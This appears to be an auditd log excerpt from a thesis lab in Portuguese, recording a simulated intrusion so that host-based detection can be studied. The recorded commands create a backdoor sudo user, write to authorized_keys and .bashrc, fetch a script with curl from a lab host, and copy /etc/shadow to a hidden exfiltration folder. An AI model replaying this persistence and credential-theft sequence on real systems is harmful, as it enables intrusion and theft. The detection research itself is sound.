+type=SYSCALL msg=audit(12/11/2026 01:18:56.000:53810) : arch=x86_64 syscall=fchown success=yes exit=0 a0=0x7 a1=0x3ea a2=0x3ea a3=0x180 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:56.000:53811) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:56.000:53811) : item=0 name=(null) inode=783990 dev=08:01 mode=file,600 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:56.000:53811) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:56.000:53811) : arch=x86_64 syscall=fchmod success=yes exit=0 a0=0x7 a1=0644 a2=0x3ea a3=0x180 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:56.000:53812) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:56.000:53812) : item=0 name=(null) inode=783990 dev=08:01 mode=file,644 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:56.000:53812) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:56.000:53812) : arch=x86_64 syscall=fsetxattr success=yes exit=0 a0=0x7 a1=0x7fb86103702f a2=0x56035d063e10 a3=0x1c items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:19:14.786:53826) : proctitle=sudo usermod -aG sudo invasor_teste 
+type=PATH msg=audit(12/11/2026 01:19:14.786:53826) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:19:14.786:53826) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:19:14.786:53826) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55b83dbb1c80 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124856 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:23:24.902:53869) : proctitle=mkdir -p /home/alvo/.ssh 
+type=PATH msg=audit(12/11/2026 01:23:24.902:53869) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:23:24.902:53869) : cwd=/home 
+type=SYSCALL msg=audit(12/11/2026 01:23:24.902:53869) : arch=x86_64 syscall=mkdir success=no exit=EEXIST(Arquivo existe) a0=0x7ffd38522683 a1=0777 a2=0x7ffd385214b0 a3=0x38b items=1 ppid=124803 pid=124881 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:23:24.902:53870) : proctitle=mkdir -p /home/alvo/.ssh 
+type=PATH msg=audit(12/11/2026 01:23:24.902:53870) : item=1 name=.ssh inode=783991 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:23:24.902:53870) : item=0 name=/home/alvo inode=783716 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:23:24.902:53870) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:23:24.902:53870) : arch=x86_64 syscall=mkdir success=yes exit=0 a0=0x7ffd38522688 a1=0777 a2=0x0 a3=0x38b items=2 ppid=124803 pid=124881 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:23:24.902:53871) : proctitle=-bash 
+type=PATH msg=audit(12/11/2026 01:23:24.902:53871) : item=1 name=/home/alvo/.ssh/authorized_keys inode=783992 dev=08:01 mode=file,664 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:23:24.902:53871) : item=0 name=/home/alvo/.ssh/ inode=783991 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:23:24.902:53871) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:23:24.902:53871) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x55fa16edf290 a2=O_WRONLY|O_CREAT|O_APPEND a3=0x1b6 items=2 ppid=124802 pid=124803 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=bash exe=/usr/bin/bash subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:24:45.003:53873) : proctitle=mkdir -p /home/alvo/.cache 
+type=PATH msg=audit(12/11/2026 01:24:45.003:53873) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:24:45.003:53873) : cwd=/home 
+type=SYSCALL msg=audit(12/11/2026 01:24:45.003:53873) : arch=x86_64 syscall=mkdir success=no exit=EEXIST(Arquivo existe) a0=0x7ffc00205681 a1=0777 a2=0x7ffc002046c0 a3=0x38b items=1 ppid=124803 pid=124882 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:24:45.003:53874) : proctitle=mkdir -p /home/alvo/.cache 
+type=PATH msg=audit(12/11/2026 01:24:45.003:53874) : item=1 name=.cache inode=783993 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:24:45.003:53874) : item=0 name=/home/alvo inode=783716 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:24:45.003:53874) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:24:45.003:53874) : arch=x86_64 syscall=mkdir success=yes exit=0 a0=0x7ffc00205686 a1=0777 a2=0x0 a3=0x38b items=2 ppid=124803 pid=124882 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:24:45.003:53875) : proctitle=-bash 
+type=PATH msg=audit(12/11/2026 01:24:45.003:53875) : item=1 name=/home/alvo/.cache/.atualiza.sh inode=783994 dev=08:01 mode=file,664 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:24:45.003:53875) : item=0 name=/home/alvo/.cache/ inode=783993 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:24:45.003:53875) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:24:45.003:53875) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x55fa1703b4d0 a2=O_WRONLY|O_CREAT|O_TRUNC a3=0x1b6 items=2 ppid=124802 pid=124803 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=bash exe=/usr/bin/bash subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:24:45.003:53877) : proctitle=chmod +x /home/alvo/.cache/.atualiza.sh 
+type=PATH msg=audit(12/11/2026 01:24:45.003:53877) : item=0 name=/home/alvo/.cache/.atualiza.sh inode=783994 dev=08:01 mode=file,664 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:24:45.003:53877) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:24:45.003:53877) : arch=x86_64 syscall=fchmodat success=yes exit=0 a0=AT_FDCWD a1=0x5567e4dac4d0 a2=0775 a3=0x1fd items=1 ppid=124803 pid=124883 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=chmod exe=/usr/bin/chmod subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:25:27.413:53889) : proctitle=-bash 
+type=PATH msg=audit(12/11/2026 01:25:27.413:53889) : item=0 name=/home/alvo/.bashrc inode=783717 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:25:27.413:53889) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:25:27.413:53889) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x55fa16f08e20 a2=O_WRONLY|O_CREAT|O_APPEND a3=0x1b6 items=1 ppid=124802 pid=124803 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=bash exe=/usr/bin/bash subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:27:31.978:53899) : proctitle=mkdir -p /home/alvo/.cache/.ferramentas 
+type=PATH msg=audit(12/11/2026 01:27:31.978:53899) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:27:31.978:53899) : cwd=/home 
+type=SYSCALL msg=audit(12/11/2026 01:27:31.978:53899) : arch=x86_64 syscall=mkdir success=no exit=EEXIST(Arquivo existe) a0=0x7ffce0664674 a1=0777 a2=0x7ffce0662e30 a3=0x38b items=1 ppid=124803 pid=124902 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:27:31.978:53900) : proctitle=mkdir -p /home/alvo/.cache/.ferramentas 
+type=PATH msg=audit(12/11/2026 01:27:31.978:53900) : item=0 name=/home/alvo inode=783716 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:27:31.978:53900) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:27:31.978:53900) : arch=x86_64 syscall=mkdir success=no exit=EEXIST(Arquivo existe) a0=0x7ffce0664679 a1=0777 a2=0x7ffce0662e30 a3=0x38b items=1 ppid=124803 pid=124902 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:27:31.978:53901) : proctitle=mkdir -p /home/alvo/.cache/.ferramentas 
+type=PATH msg=audit(12/11/2026 01:27:31.978:53901) : item=1 name=.ferramentas inode=783995 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:27:31.978:53901) : item=0 name=/home/alvo/.cache inode=783993 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:27:31.978:53901) : cwd=/home/alvo/.cache 
+type=SYSCALL msg=audit(12/11/2026 01:27:31.978:53901) : arch=x86_64 syscall=mkdir success=yes exit=0 a0=0x7ffce0664680 a1=0777 a2=0x0 a3=0x38b items=2 ppid=124803 pid=124902 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=mkdir exe=/usr/bin/mkdir subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:27:52.380:53906) : proctitle=curl -s -o /home/alvo/.cache/.ferramentas/ferramenta.sh http://192.168.56.1:8000/ferramenta.sh 
+type=PATH msg=audit(12/11/2026 01:27:52.380:53906) : item=1 name=/home/alvo/.cache/.ferramentas/ferramenta.sh inode=783996 dev=08:01 mode=file,664 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:27:52.380:53906) : item=0 name=/home/alvo/.cache/.ferramentas/ inode=783995 dev=08:01 mode=dir,775 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:27:52.380:53906) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:27:52.380:53906) : arch=x86_64 syscall=openat success=yes exit=5 a0=AT_FDCWD a1=0x55cb52764dc0 a2=O_WRONLY|O_CREAT|O_TRUNC a3=0x1b6 items=2 ppid=124803 pid=124903 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:28:35.519:53908) : proctitle=chmod +x /home/alvo/.cache/.ferramentas/ferramenta.sh 
+type=PATH msg=audit(12/11/2026 01:28:35.519:53908) : item=0 name=/home/alvo/.cache/.ferramentas/ferramenta.sh inode=783996 dev=08:01 mode=file,664 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:28:35.519:53908) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:28:35.519:53908) : arch=x86_64 syscall=fchmodat success=yes exit=0 a0=AT_FDCWD a1=0x55bd56eff4d0 a2=0775 a3=0x1fd items=1 ppid=124803 pid=124904 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=chmod exe=/usr/bin/chmod subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:29:12.247:53922) : proctitle=sudo sh -c echo "# alteracao tcc" >> /etc/ssh/sshd_config 
+type=PATH msg=audit(12/11/2026 01:29:12.247:53922) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:29:12.247:53922) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:29:12.247:53922) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55e502d66cd0 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124906 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:30:59.131:53959) : proctitle=sudo -l 
+type=PATH msg=audit(12/11/2026 01:30:59.131:53959) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:30:59.131:53959) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:30:59.131:53959) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55fceae3e290 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124917 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:31:12.823:53971) : proctitle=sudo cat /etc/shadow 
+type=PATH msg=audit(12/11/2026 01:31:12.823:53971) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:31:12.823:53971) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:31:12.823:53971) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55d85a305c80 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124920 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:31:31.378:53991) : proctitle=sudo tee /etc/sudoers.d/invasor_teste 
+type=PATH msg=audit(12/11/2026 01:31:31.378:53991) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:31:31.378:53991) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:31:31.378:53991) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55739284ecb0 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124926 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:31:31.390:54012) : proctitle=sudo chmod 440 /etc/sudoers.d/invasor_teste 
+type=PATH msg=audit(12/11/2026 01:31:31.390:54012) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:31:31.390:54012) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:31:31.390:54012) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55a67b6edf40 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124930 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:31:46.339:54034) : proctitle=sudo -u invasor_teste sudo -n id 
+type=PATH msg=audit(12/11/2026 01:31:46.339:54034) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:31:46.339:54034) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:31:46.339:54034) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x5643c5b83440 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124934 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:31:46.347:54051) : proctitle=sudo -n id 
+type=PATH msg=audit(12/11/2026 01:31:46.347:54051) : item=1 name=/home/invasor_teste/.sudo_as_admin_successful inode=783997 dev=08:01 mode=file,644 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:31:46.347:54051) : item=0 name=/home/invasor_teste/ inode=783987 dev=08:01 mode=dir,700 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:31:46.347:54051) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:31:46.347:54051) : arch=x86_64 syscall=openat success=yes exit=6 a0=AT_FDCWD a1=0x5569515b0e20 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=2 ppid=124936 pid=124937 auid=alvo uid=invasor_teste gid=invasor_teste euid=invasor_teste suid=root fsuid=invasor_teste egid=invasor_teste sgid=invasor_teste fsgid=invasor_teste tty=pts4 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:33:34.253:54090) : proctitle=sudo cp /etc/shadow /tmp/.exf/shadow.copia 
+type=PATH msg=audit(12/11/2026 01:33:34.253:54090) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:33:34.253:54090) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:33:34.253:54090) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x5610a1003f40 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124957 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:33:34.265:54111) : proctitle=sudo chown alvo /tmp/.exf/shadow.copia 
+type=PATH msg=audit(12/11/2026 01:33:34.265:54111) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:33:34.265:54111) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:33:34.265:54111) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55c971a09f20 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124961 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:36:11.630:54160) : proctitle=sudo /root/tcc-scripts/snapshot_osquery.sh durante 
+type=PATH msg=audit(12/11/2026 01:36:11.630:54160) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:36:11.630:54160) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:36:11.630:54160) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55b76df12f60 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=124974 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:39:43.654:54243) : proctitle=sudo grep -c invasor_teste /root/tcc/osquery/durante/usuarios.json 
+type=PATH msg=audit(12/11/2026 01:39:43.654:54243) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:39:43.654:54243) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:39:43.654:54243) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x564b732dbf70 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=125035 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:39:47.150:54263) : proctitle=sudo grep -c atualiza /root/tcc/osquery/durante/crontab.json 
+type=PATH msg=audit(12/11/2026 01:39:47.150:54263) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:39:47.150:54263) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:39:47.150:54263) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x558021deff60 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=125039 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
